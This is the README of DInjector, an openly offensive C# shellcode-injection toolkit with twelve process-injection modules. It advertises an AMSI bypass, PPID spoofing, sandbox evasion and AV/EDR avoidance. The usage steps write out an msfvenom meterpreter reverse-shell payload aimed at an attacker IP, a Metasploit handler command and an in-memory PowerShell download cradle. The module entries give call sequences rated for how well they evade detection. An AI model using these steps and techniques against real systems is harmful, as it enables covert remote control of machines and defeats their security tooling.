DInjector
==========

```
     (    (
     )\ ) )\ )                   )             (   (  (
    (()/((()/(     (    (     ( /(    (        )\ ))\ )\
     /(_))/(_))(   )\  ))\ (  )\())(  )(      (()/((_|(_)
    (_))_(_))  )\ |(_)/((_))\(_))/ )\(()\      ((_))  _
     |   \_ _|_(_/( !(_)) ((_) |_ ((_)((_)     _| | || |
     | |) | || ' \)) / -_) _||  _/ _ \ '_|  _/ _` | || |
     |___/___|_||_|/ \___\__| \__\___/_|   (_)__,_|_||_|
                 |__/-----------------------------------
                                                K E E P
                                                C A L M
                                                  A N D
                                       D / I N 💉 E C T
                                      S H E L L C O D E
```

This repository is an accumulation of my code snippets for various **shellcode injection** techniques using fantastic [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) API by @TheWover and @FuzzySecurity.

Features:

* Fully ported to D/Invoke API
* Encrypted payloads which can be invoked from a URL or passed in base64 as an argument
* Built-in AMSI bypass
* [PPID spoofing](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing) and [block non-Microsoft DLLs](https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes) (stolen from [TikiTorch](https://github.com/rasta-mouse/TikiTorch), write-up is [here](https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/))
* Sandbox detection & evasion

:information_source: Based on my testings the DInvoke NuGet [package](https://www.nuget.org/packages/DInvoke/) itself is being flagged by many commercial AV/EDR solutions when incuded as an embedded resource via [Costura.Fody](https://www.nuget.org/packages/Costura.Fody/) (or similar approaches), so I've shrinked it a bit and included from [source](https://github.com/TheWover/DInvoke) to achieve better OpSec.

## Usage

1. Compile the project in VS.
2. Generate a shellcode for your favourite C2:

```console
~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
```

3. [Encrypt](encrypt.py) the shellcode:

```console
~$ encrypt.py shellcode.bin -p 'Passw0rd!' -o enc
```

4. Serve the encrypted shellcode and prepare C2 listener:

```console
~$ sudo python3 -m http.server 80
~$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost 10.10.13.37; set lport 443; set EXITFUNC thread; run"
```

5. Use the PowerShell download [cradle](/cradle.ps1) to load DInjector.dll as `System.Reflection.Assembly` and execute it from memory.

:warning: I **do not** recommend putting the assembly on disk because it will very likely be flagged.

Required global arguments:

| Name        | Example Value            | Description                                                        |
|-------------|--------------------------|--------------------------------------------------------------------|
| `/am51`     | `True`, `False`          | Applies AMSI bypass                                                |
| `/sc`       | `http://10.10.13.37/enc` | Sets shellcode path (can be loaded from URL or as a Base64 string) |
| `/password` | `Passw0rd!`              | Sets password to decrypt the shellcode                             |

## Modules

:warning: OpSec safe considerations are based on my personal usage expirience and some testings along the way.

### [FunctionPointer](/DInjector/Modules/FunctionPointer.cs)

```yaml
module_name: 'functionpointer'
description: |
  Allocates a RW memory region, copies the shellcode into it
  and executes it like a function.
calls:
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: false
references:
  - 'http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/'
  - 'https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis'
  - 'https://www.fergonez.net/post/shellcode-csharp'
```

### [FunctionPointerV2](/DInjector/Modules/FunctionPointerV2.cs)

```yaml
module_name: 'functionpointerv2'
description: |
  Sets RX on a byte array and executes it like a function.
calls:
  - ntdll.dll:
    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: false
references:
  - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-1/'
  - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-2/'
  - 'https://github.com/jhalon/SharpCall/blob/master/Syscalls.cs'
```

### [ClipboardPointer](/DInjector/Modules/ClipboardPointer.cs)

```yaml
module_name: 'clipboardpointer'
description: |
  Copies shellcode bytes into the clipboard,
  sets RX on it and executes it like a function.
calls:
  - user32.dll:
    1: 'OpenClipboard'
    2: 'SetClipboardData'
    3: 'CloseClipboard'
  - ntdll.dll:
    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
opsec_safe: true
references:
  - 'https://gist.github.com/Wra7h/69a03c802ae6977e74b1152a4b004515'
```

### [CurrentThread](/DInjector/Modules/CurrentThread.cs)

```yaml
module_name: 'currentthread'
description: |
  Injects shellcode into current process.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    3: 'NtCreateThreadEx'
    4: 'NtWaitForSingleObject'
opsec_safe: false
references:
  - 'https://github.com/XingYun-Cloud/D-Invoke-syscall/blob/main/Program.cs'
```

### [CurrentThreadUuid](/DInjector/Modules/CurrentThreadUuid.cs)

```yaml
module_name: 'currentthreaduuid'
description: |
  Injects shellcode into current process.
  Thread execution via EnumSystemLocalesA.
calls:
  - kernel32.dll:
    1: 'HeapCreate'
    2: 'EnumSystemLocalesA'
  - rpcrt4.dll:
    1: 'UuidFromStringA'
opsec_safe: -
references:
  - 'https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/'
  - 'https://github.com/ChoiSG/UuidShellcodeExec/blob/main/USEConsole/Program.cs'
```

### [RemoteThread](/DInjector/Modules/RemoteThread.cs)

```yaml
module_name: 'remotethread'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    3: 'NtWriteVirtualMemory'
    4: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    5: 'NtCreateThreadEx'
opsec_safe: false
references:
  - 'https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/SharpImpersonation/Shellcode.cs'
```

### [RemoteThreadDll](/DInjector/Modules/RemoteThreadDll.cs)

```yaml
module_name: 'remotethreaddll'
arguments: |
  /pid:1337
  /dll:msvcp_win.dll
description: |
  Injects shellcode into an existing remote process
  overwriting one of its loaded modules' .text section.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtWriteVirtualMemory'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtCreateThreadEx'
opsec_safe: -
references:
  - 'https://www.netero1010-securitylab.com/eavsion/alternative-process-injection'
```

### [RemoteThreadView](/DInjector/Modules/RemoteThreadView.cs)

```yaml
module_name: 'remotethreadview'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process.
  Thread execution via RtlCreateUserThread.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtCreateSection (PAGE_EXECUTE_READWRITE)'
    3: 'NtMapViewOfSection (PAGE_READWRITE)'
    4: 'NtMapViewOfSection (PAGE_EXECUTE_READ)'
    5: 'RtlCreateUserThread'
    6: 'NtUnmapViewOfSection'
    7: 'NtClose'
opsec_safe: false
references:
  - 'https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs'
```

### [RemoteThreadSuspended](/DInjector/Modules/RemoteThreadSuspended.cs)

```yaml
module_name: 'remotethreadsuspended'
arguments: |
  /pid:1337
description: |
  Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
  After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
  Thread execution via NtCreateThreadEx.
calls:
  - ntdll.dll:
    1: 'NtOpenProcess'
    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    3: 'NtWriteVirtualMemory'
    4: 'NtProtectVirtualMemory (PAGE_NOACCESS)'
    5: 'NtCreateThreadEx (CREATE_SUSPENDED)'
    6: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    7: 'NtResumeThread'
opsec_safe: true
references:
  - 'https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/'
  - 'https://github.com/plackyhacker/Suspended-Thread-Injection/blob/main/injection.cs'
```

### [RemoteThreadAPC](/DInjector/Modules/RemoteThreadAPC.cs)

```yaml
module_name: 'remotethreadapc'
arguments: |
  /image:C:\Windows\System32\svchost.exe /ppid:31337 /blockDlls:True
description: |
  Injects shellcode into a newly spawned remote process.
  Thread execution via NtQueueApcThread.
calls:
  - kernel32.dll:
    1: 'InitializeProcThreadAttributeList'
    2: 'UpdateProcThreadAttribute (blockDLLs)'
    3: 'UpdateProcThreadAttribute (PPID)'
    4: 'CreateProcessA'
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtWriteVirtualMemory'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtOpenThread'
    5: 'NtQueueApcThread'
    6: 'NtAlertResumeThread'
opsec_safe: true
references:
  - 'https://rastamouse.me/exploring-process-injection-opsec-part-2/'
  - 'https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0'
```

### [RemoteThreadContext](/DInjector/Modules/RemoteThreadAPC.cs)

```yaml
module_name: 'remotethreadcontext'
arguments: |
  /image:C:\Windows\System32\svchost.exe /ppid:31337 /blockDlls:True
description: |
  Injects shellcode into a newly spawned remote process.
  Thread execution via SetThreadContext.
calls:
  - kernel32.dll:
    1: 'InitializeProcThreadAttributeList'
    2: 'UpdateProcThreadAttribute (blockDLLs)'
    3: 'UpdateProcThreadAttribute (PPID)'
    4: 'CreateProcessA'
  - ntdll.dll:
    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
    2: 'NtWriteVirtualMemory'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
    4: 'NtCreateThreadEx (CREATE_SUSPENDED)'
    5: 'GetThreadContext'
    6: 'SetThreadContext'
    7: 'NtResumeThread'
opsec_safe: true
references:
  - 'https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/'
  - 'https://github.com/djhohnstein/CSharpSetThreadContext/blob/master/Runner/Program.cs'
```

### [ProcessHollow](/DInjector/Modules/ProcessHollow.cs)

```yaml
module_name: 'processhollow'
arguments: |
  /image:C:\Windows\System32\svchost.exe /ppid:31337 /blockDlls:True
description: |
  Injects shellcode into a newly spawned remote process.
  Thread execution via NtResumeThread (hollowing with shellcode).
calls:
  - kernel32.dll:
    1: 'InitializeProcThreadAttributeList'
    2: 'UpdateProcThreadAttribute (blockDLLs)'
    3: 'UpdateProcThreadAttribute (PPID)'
    4: 'CreateProcessA'
  - ntdll.dll:
    1: 'NtQueryInformationProcess'
    2: 'NtReadVirtualMemory'
    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)'
    4: 'NtWriteVirtualMemory'
    5: 'NtProtectVirtualMemory (oldProtect)'
    6: 'NtResumeThread'
opsec_safe: false
references:
  - 'https://github.com/CCob/SharpBlock/blob/master/Program.cs'
```

## Credits

* @TheWover and @FuzzySecurity for their awesome [DInvoke](https://github.com/TheWover/DInvoke) project.
* All those great researchers mentioned in the modules references above.
